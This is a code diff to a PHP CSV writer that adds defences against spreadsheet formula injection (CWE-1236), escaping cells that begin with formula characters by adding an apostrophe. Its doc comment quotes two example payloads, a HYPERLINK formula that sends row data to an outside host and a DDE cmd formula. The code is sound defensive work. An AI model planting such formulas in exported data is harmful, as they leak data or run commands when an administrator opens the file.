@@ -39,12 +39,61 @@ final class Csv
     }
 
     /**
+     * The characters a spreadsheet reads as the start of a formula.
+     *
+     * Tab and carriage return are here because Excel strips leading
+     * whitespace before deciding, so `"\t=cmd"` is still a formula.
+     *
+     * @var list<string>
+     */
+    private const FORMULA_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];
+
+    /**
      * @param  resource  $handle
      * @param  list<string>  $row
+     * @param  bool  $escapeFormulas  see `neutralize()`
      */
-    public static function write($handle, array $row): void
+    public static function write($handle, array $row, bool $escapeFormulas = true): void
     {
+        if ($escapeFormulas) {
+            $row = array_map(self::neutralize(...), $row);
+        }
+
         fputcsv($handle, $row, escape: '');
+    }
+
+    /**
+     * Stops a spreadsheet executing a cell that came out of the database.
+     *
+     * A CSV cell beginning with `=`, `+`, `-` or `@` is a formula as far as
+     * Excel, LibreOffice and Sheets are concerned, and they evaluate it when
+     * the file is opened. `=HYPERLINK("http://x?"&A1,"Click")` exfiltrates the
+     * row beside it to whoever typed it; `=cmd|'/c calc'!A1` is worse. The
+     * attacker is anyone who can write a text field, and the victim is the
+     * administrator who opens the export — which is exactly the shape of an
+     * admin panel. It is CWE-1236, and quoting does not prevent it: CSV
+     * quoting is about parsing the file, not about what the cell means once
+     * parsed.
+     *
+     * The fix is a leading apostrophe, which every spreadsheet reads as "this
+     * cell is text" and does not display. It changes the bytes, which is why
+     * `Exporter::escapesFormulas()` can turn it off for a feed that another
+     * *program* parses — there, nothing evaluates anything and the apostrophe
+     * would be data corruption instead of a fix.
+     *
+     * XLSX needs none of this: `Xlsx` writes `t="inlineStr"` cells, and a
+     * formula in that format lives in an `<f>` element the writer never
+     * emits. A literal `=SUM(A1)` in an inline string is shown, not run.
+     */
+    public static function neutralize(string $value): string
+    {
+        if ($value === '') {
+            return $value;
+        }
+
+        return in_array($value[0], self::FORMULA_PREFIXES, true)
+            ? "'".$value
+            : $value;
     }
 
     /**
